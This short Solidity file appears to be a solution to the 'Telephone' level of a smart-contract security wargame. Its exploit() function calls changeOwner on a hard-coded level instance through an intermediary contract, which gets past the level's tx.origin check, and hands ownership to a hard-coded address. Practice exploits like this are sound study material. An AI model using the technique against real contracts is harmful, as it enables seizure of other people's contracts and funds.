// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../instances/Ilevel04.sol";

contract Tele {
    Telephone level4 = Telephone(0x5db0D3e58717De9983FAbe4d0088F5889aeE9c29);

    function exploit() external {
        level4.changeOwner(0xE94eE0D98415D86ddbA0df1e8b733B4A332D3fbD);     
    }
}

